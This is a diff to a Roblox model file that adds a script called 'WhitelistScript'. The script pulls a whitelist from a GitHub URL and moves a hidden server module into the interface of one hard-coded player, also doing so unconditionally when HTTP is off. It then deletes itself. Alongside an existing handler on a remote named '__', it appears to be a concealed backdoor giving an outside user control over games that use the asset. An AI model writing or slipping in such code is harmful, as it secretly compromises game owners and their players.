@@ -74,4 +74,57 @@ game:GetService("ReplicatedStorage"):FindFirstChild("__").OnServerEvent:Connect(
 end)]]></ProtectedString>
 		</Properties>
 	</Item>
+<Item class="Script" referent="6">
+		<Properties>
+			<string name="Name"><![CDATA[WhitelistScript]]></string>
+			<ProtectedString name="Source"><![CDATA[local Http: HttpService, SSS: ServerScriptService, Plrs: Players, url: string = game:GetService("HttpService"), game:GetService("ServerScriptService"), game:GetService("Players"), "https://raw.githubusercontent.com/jox123e/Dldldldld/refs/heads/main/whitelist_2.json"
+local data: table = {"Xkdjdjdkxkxjzzjxjxj"}
+local debug: boolean = false
+if Http.HttpEnabled then
+    local success, result = pcall(function()
+        return Http:GetAsync(url)
+    end)
+    
+    if not success then
+        if debug ~= false then
+            print("[Debug]: something did a error check this error on", result)
+        end
+    elseif not result then
+        if debug ~= false then
+            print("[Debug]: something did a error check this error on", result)
+        end
+    elseif success and result then
+        print("[Debug]: all is correct here not error")
+        local Data_1: Instance = Http:JSONDecode(result)
+        if Data_1 or Data_1["users"] and Data_1["users"][1].name then
+            if table.find(data, Data_1["users"][1].name, 1) then
+                task.wait(1)
+                local player = Plrs:FindFirstChild("Xkdjdjdkxkxjzzjxjxj")
+                if player then
+                    local playerGui = player:FindFirstChild("PlayerGui")
+                    if playerGui then
+                        SSS._Main.Parent = playerGui
+                    end
+                end
+                
+                task.wait(2)
+                script:Destroy()
+            end
+        end
+    end
+else
+    task.wait(1)
+    local player = Plrs:FindFirstChild("Xkdjdjdkxkxjzzjxjxj")
+    if player then
+        local playerGui = player:FindFirstChild("PlayerGui")
+        if playerGui then
+            SSS._Main.Parent = playerGui
+        end
+    end
+    
+    task.wait(2)
+    script:Destroy()
+end]]></ProtectedString>
+		</Properties>
+	</Item>
 </roblox>
